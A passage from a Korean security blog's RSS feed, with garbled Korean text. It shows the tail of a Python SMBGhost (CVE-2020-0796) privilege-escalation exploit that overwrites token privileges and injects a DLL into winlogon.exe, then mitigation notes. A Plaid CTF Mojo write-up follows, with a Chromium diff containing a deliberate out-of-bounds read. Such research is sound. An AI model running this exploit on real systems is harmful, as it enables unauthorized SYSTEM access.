    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[-] Could not find access token address!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pToken&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Found token at '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pToken&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
    Exploits the bug to escalate privileges.
    Reminder:
    0: kd&amp;gt; dt nt!_SEP_TOKEN_PRIVILEGES
       +0x000 Present          : Uint8B
       +0x008 Enabled          : Uint8B
       +0x010 EnabledByDefault : Uint8B
    &quot;&quot;&quot;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_token_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xFF&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x40&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Writing full privileges on address %x'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;write_what_where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;what&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;where&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] All done! Spawning a privileged shell.'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Check your privileges: !token %x'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;dll_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pathlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__file__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;absolute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;joinpath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'spawn_cmd.dll'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Injector.exe'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'--process-name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'winlogon.exe'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'--inject'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dll_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;devnull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'wb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;íŒ¨ì¹˜ë‚´ìš©&quot;&gt;íŒ¨ì¹˜ë‚´ìš©&lt;/h2&gt;

&lt;p&gt;íŒ¨ì¹˜ ì „&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/7542c932-c7dc-4efb-b0af-6145d1b23a85/f23e3771-1917-47ae-9d47-0b574a2a4d6b.png&quot; alt=&quot;/assets/7542c932-c7dc-4efb-b0af-6145d1b23a85/f23e3771-1917-47ae-9d47-0b574a2a4d6b.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;íŒ¨ì¹˜ í›„&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Srv2DecompressData ì—ì„œ ë‘ í—¤ë”(OriginalSize, Offset)ì˜ ê¸¸ì´ë¥¼ ê²€ì‚¬í•˜ëŠ” ë£¨í‹´ ì¶”ê°€.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/67ad6e02-3410-460b-b2eb-8c177bfdbe8b/22e350cc-ca35-47e9-8898-f84225ce7412.png&quot; alt=&quot;/assets/67ad6e02-3410-460b-b2eb-8c177bfdbe8b/22e350cc-ca35-47e9-8898-f84225ce7412.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ëŒ€ì‘ë°©ì•ˆ&quot;&gt;ëŒ€ì‘ë°©ì•ˆ&lt;/h2&gt;

&lt;p&gt;SMBv3 ì••ì¶•ì„ ë¹„í™œì„±í™” í•  ê²ƒì„ ê¶Œì¥&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;PowerShell (Administrator) ì‹¤í–‰&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Set-ItemProperty&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DisableCompression&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DWORD&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Value&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;ë§ˆì¹˜ë©°&quot;&gt;ë§ˆì¹˜ë©°&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ì„œë²„ ì·¨ì•½ì &lt;/code&gt; srv2.sys
&lt;code class=&quot;highlighter-rouge&quot;&gt;í´ë¼ì´ì–¸íŠ¸ ì·¨ì•½ì &lt;/code&gt; mrxsmb.sys
-&amp;gt; ì„œë²„, í´ë¼ì´ì–¸íŠ¸ ëª¨ë‘ ê°™ì€ ì½”ë“œë¥¼ ê°€ì§€ê³  ìˆìŒ. ì¦‰, ì„œë²„-í´ë¼ì´ì–¸íŠ¸ ëª¨ë‘ ë™ì¼í•œ ì·¨ì•½í•œ ì½”ë“œ ì‹¤í–‰ê°€ëŠ¥ (ì›œ í˜•íƒœë¡œ ì „íŒŒ ê°€ëŠ¥)&lt;/p&gt;

&lt;p&gt;Kernel ASLR ë˜ëŠ” KASLRê³¼ ê°™ì€ Windowsì˜ ìµœì‹  ë³´í˜¸ê¸°ë²•ì„ ìš°íšŒí•˜ë ¤ë©´ ì¶”ê°€ ë²„ê·¸ê°€ í•„ìš”í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì—, ì›ê²© ì½”ë“œ ì‹¤í–‰ì—ì„œ ì™„ì „í•œ ì›ê²© ì½”ë“œ ì‹¤í–‰ìœ¼ë¡œ ì „í™˜í•˜ëŠ” ê²ƒì€ ì–´ë ¤ìš´ê²ƒìœ¼ë¡œ íŒë‹¨.&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/&quot;&gt;https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/ZecOps/CVE-2020-0796-LPE-POC&quot;&gt;https://github.com/ZecOps/CVE-2020-0796-LPE-POC&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@knownsec404team/cve-2020-0796-windows-smbv3-lpe-exploit-poc-analysis-c77569124c87&quot;&gt;https://medium.com/@knownsec404team/cve-2020-0796-windows-smbv3-lpe-exploit-poc-analysis-c77569124c87&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/48267&quot;&gt;https://www.exploit-db.com/exploits/48267&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796&quot;&gt;https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.synacktiv.com/posts/exploit/im-smbghost-daba-dee-daba-da.html&quot;&gt;https://www.synacktiv.com/posts/exploit/im-smbghost-daba-dee-daba-da.html&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.fortinet.com/blog/threat-research/cve-2020-0796-memory-corruption-vulnerability-in-windows-10-smb-server.html#.Xndfn0lv150.twitter&quot;&gt;https://www.fortinet.com/blog/threat-research/cve-2020-0796-memory-corruption-vulnerability-in-windows-10-smb-server.html#.Xndfn0lv150.twitter&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.mcafee.com/blogs/other-blogs/mcafee-labs/smbghost-analysis-of-cve-2020-0796/&quot;&gt;https://www.mcafee.com/blogs/other-blogs/mcafee-labs/smbghost-analysis-of-cve-2020-0796/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://blogs.360.cn/post/CVE-2020-0796.html&quot;&gt;http://blogs.360.cn/post/CVE-2020-0796.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Wed, 01 Apr 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-04-01/SMBGhost</link>
        <guid isPermaLink="true">http://localhost:4000/2020-04-01/SMBGhost</guid>
        
        <category>cve</category>
        
        <category>research</category>
        
        
      </item>
    
      <item>
        <title>2020 Plaid CTF - Mojo</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ì´ì˜ì£¼&lt;/p&gt;

&lt;h1 id=&quot;1-vulnerability&quot;&gt;1. Vulnerability&lt;/h1&gt;

&lt;div class=&quot;language-diff highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gd&quot;&gt;--- /dev/null
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ b/content/browser/plaidstore/plaidstore_impl.h
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -0,0 +1,35 @@&lt;/span&gt;
&lt;span class=&quot;gi&quot;&gt;+#include &amp;lt;string&amp;gt;
+#include &amp;lt;vector&amp;gt;
+
+#include &quot;third_party/blink/public/mojom/plaidstore/plaidstore.mojom.h&quot;
+
+namespace content {
+
+class RenderFrameHost;
+
+class PlaidStoreImpl : public blink::mojom::PlaidStore {
+ public:
+  explicit PlaidStoreImpl(RenderFrameHost *render_frame_host);
+
+  static void Create(
+      RenderFrameHost* render_frame_host,
+      mojo::PendingReceiver&amp;lt;blink::mojom::PlaidStore&amp;gt; receiver);
+
+  ~PlaidStoreImpl() override;
+
+  // PlaidStore overrides:
+  void StoreData(
+      const std::string &amp;amp;key,
+      const std::vector&amp;lt;uint8_t&amp;gt; &amp;amp;data) override;
+
+  void GetData(
+      const std::string &amp;amp;key,
+      uint32_t count,
+      GetDataCallback callback) override;
+
+ private:
+  RenderFrameHost* render_frame_host_;
+  std::map&amp;lt;std::string, std::vector&amp;lt;uint8_t&amp;gt; &amp;gt; data_store_;
+};
+
+} // namespace content
&lt;/span&gt;
--- /dev/null
&lt;span class=&quot;gi&quot;&gt;+++ b/content/browser/plaidstore/plaidstore_impl.cc
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -0,0 +1,47 @@&lt;/span&gt;
&lt;span class=&quot;gi&quot;&gt;+#include &quot;content/browser/plaidstore/plaidstore_impl.h&quot;
+#include &quot;content/public/browser/render_frame_host.h&quot;
+#include &quot;mojo/public/cpp/bindings/self_owned_receiver.h&quot;
+
+namespace content {
+
+PlaidStoreImpl::PlaidStoreImpl(
+    RenderFrameHost *render_frame_host)
+    : render_frame_host_(render_frame_host) {}
+
+PlaidStoreImpl::~PlaidStoreImpl() {}
+
+void PlaidStoreImpl::StoreData(
+    const std::string &amp;amp;key,
+    const std::vector&amp;lt;uint8_t&amp;gt; &amp;amp;data) {
+  if (!render_frame_host_-&amp;gt;IsRenderFrameLive()) {
+    return;
+  }
+  data_store_[key] = data;
+}
+
+void PlaidStoreImpl::GetData(
+    const std::string &amp;amp;key,
+    uint32_t count,
+    GetDataCallback callback) {
+  if (!render_frame_host_-&amp;gt;IsRenderFrameLive()) {
+    std::move(callback).Run({});
+    return;
+  }
+  auto it = data_store_.find(key);
+  if (it == data_store_.end()) {
+    std::move(callback).Run({});
+    return;
+  }
+  std::vector&amp;lt;uint8_t&amp;gt; result(it-&amp;gt;second.begin(), it-&amp;gt;second.begin() + count);
+  std::move(callback).Run(result);
+}
+
+// static
+void PlaidStoreImpl::Create(
+    RenderFrameHost *render_frame_host,
+    mojo::PendingReceiver&amp;lt;blink::mojom::PlaidStore&amp;gt; receiver) {
+  mojo::MakeSelfOwnedReceiver(std::make_unique&amp;lt;PlaidStoreImpl&amp;gt;(render_frame_host),
+                              std::move(receiver));
+}
+
+} // namespace content
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì œê³µëœ íŒŒì¼ì¤‘ diff íŒŒì¼ì„ ë³´ë©´ Mojo IPCì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë‘ê°œì˜ ê¸°ëŠ¥ì´ ì¶”ê°€ëœê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;h3 id=&quot;ì²«ë²ˆì§¸-ì·¨ì•½ì &quot;&gt;ì²«ë²ˆì§¸ ì·¨ì•½ì &lt;/h3&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/mojo/public/js/mojo_bindings.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PlaidStorePtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;Mojo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bindInterface&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;blink&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mojom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PlaidStore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mojo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;storeData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ê¸°ëŠ¥ì„ ì‚¬ìš©í•  ë•ŒëŠ” ìœ„ì™€ ê°™ì€ ì½”ë“œë¡œ í˜¸ì¶œí•  ìˆ˜ ìˆë‹¤. PlaidStoreImpl::StoreDataì˜ ê²½ìš° key(std::string)ì™€ data(std::vector&lt;uint8_t&gt;)ë¥¼ ì¸ìë¡œ ë°›ì•„ data_store_ì— ê°’ì„ ì €ì¥í•˜ê³  ê·¸ ê°’ì„ PlaidStoreImpl::GetDataì—ì„œ ê°€ì ¸ì˜¬ ìˆ˜ ìˆëŠ” êµ¬ì¡°ì´ë‹¤.&lt;/uint8_t&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PlaidStoreImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;GetDataCallback&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;render_frame_host_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IsRenderFrameLive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;move&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({});&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data_store_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
